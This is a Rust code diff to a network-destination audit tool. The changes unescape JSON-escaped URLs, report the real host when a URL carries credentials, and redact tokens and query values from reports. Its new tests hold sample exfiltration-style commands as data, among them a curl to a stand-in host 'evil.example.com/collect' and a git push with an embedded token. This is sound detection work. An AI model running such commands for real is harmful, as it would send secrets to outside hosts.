@@ -262,7 +262,17 @@ fn extract_line_meta(line: &str) -> (Option<String>, Option<String>) {
 fn scan_content(content: &str, rules: &[Rule]) -> Vec<RawMatch> {
     let mut out = Vec::new();
     let mut seen: HashSet<(usize, String)> = HashSet::new();
-    for (idx, line) in content.lines().enumerate() {
+    for (idx, raw_line) in content.lines().enumerate() {
+        // JSON transcripts escape forward slashes, so `https:\/\/host` reached
+        // the rules as a literal and matched nothing — a silent "no external
+        // destinations" for exactly the files this audit reads.
+        let unescaped;
+        let line = if raw_line.contains("\\/") {
+            unescaped = raw_line.replace("\\/", "/");
+            unescaped.as_str()
+        } else {
+            raw_line
+        };
         let mut line_hits: Vec<RawMatch> = Vec::new();
         for rule in rules {
             for caps in rule.re.captures_iter(line) {
@@ -305,16 +315,48 @@ fn normalize_host(raw: &str) -> String {
         .or_else(|| normalized.strip_prefix("http://"))
         .or_else(|| normalized.strip_prefix("ssh://"))
         .unwrap_or(&normalized);
-    let host = without_scheme
-        .split(['/', ':', '?', '#'])
+    // Drop `user:token@` userinfo. `https://<token>@github.com/...` is exactly
+    // the exfiltration shape this audit exists to surface, and without this the
+    // username was reported as the host — the real destination never appeared,
+    // and the reputation check ran against the wrong string.
+    let authority = without_scheme
+        .split(['/', '?', '#'])
+        .next()
+        .unwrap_or(without_scheme);
+    let host_part = match authority.rsplit_once('@') {
+        Some((_, after)) => after,
+        None => authority,
+    };
+    let host = host_part
+        .split([':', '/', '?', '#'])
         .next()
         .unwrap_or("")
         .trim_matches(|c: char| !c.is_ascii_alphanumeric() && c != '.' && c != '-');
     host.strip_prefix("www.").unwrap_or(host).to_string()
 }
 
+/// Reported destination, with credentials and query values removed. This report
+/// is what a user reads to review sensitive network activity — echoing
+/// `?token=sk-...` back into it would leak the very secret it surfaces.
 fn normalize_target(raw: &str) -> String {
-    trim_target(raw).to_string()
+    let trimmed = trim_target(raw);
+    let (base, rest) = match trimmed.split_once(['?', '#']) {
+        Some((b, _)) => (b, true),
+        None => (trimmed, false),
+    };
+    // Strip `scheme://user:pass@` → `scheme://`.
+    let cleaned = match base.split_once("://") {
+        Some((scheme, after)) => match after.split_once('@') {
+            Some((_, host_and_path)) => format!("{scheme}://{host_and_path}"),
+            None => base.to_string(),
+        },
+        None => base.to_string(),
+    };
+    if rest {
+        format!("{cleaned}?[REDACTED]")
+    } else {
+        cleaned
+    }
 }
 
 fn trim_target(raw: &str) -> &str {
@@ -742,6 +784,50 @@ mod tests {
 
     fn test_rules() -> Vec<Rule> {
         bundled_rules()
+    }
+
+    #[test]
+    fn credentials_in_url_report_the_real_host_not_the_username() {
+        let hits = scan_content(
+            "git push https://ghp_secrettoken@github.com/org/repo.git",
+            &test_rules(),
+        );
+        assert!(
+            hits.iter().any(|h| h.host == "github.com"),
+            "hosts: {:?}",
+            hits.iter().map(|h| &h.host).collect::<Vec<_>>()
+        );
+        assert!(
+            hits.iter().all(|h| !h.target.contains("ghp_secrettoken")),
+            "credential echoed into the report: {:?}",
+            hits.iter().map(|h| &h.target).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn query_string_secrets_are_redacted_from_the_target() {
+        let hits = scan_content(
+            "curl https://api.example.com/upload?token=sk-abc123",
+            &test_rules(),
+        );
+        assert!(!hits.is_empty());
+        assert!(
+            hits.iter().all(|h| !h.target.contains("sk-abc123")),
+            "{:?}",
+            hits.iter().map(|h| &h.target).collect::<Vec<_>>()
+        );
+    }
+
+    #[test]
+    fn json_escaped_urls_are_still_detected() {
+        let hits = scan_content(
+            r#"{"cmd":"curl https:\/\/evil.example.com\/collect"}"#,
+            &test_rules(),
+        );
+        assert!(
+            hits.iter().any(|h| h.host == "evil.example.com"),
+            "escaped URL invisible to the audit"
+        );
     }
 
     #[test]
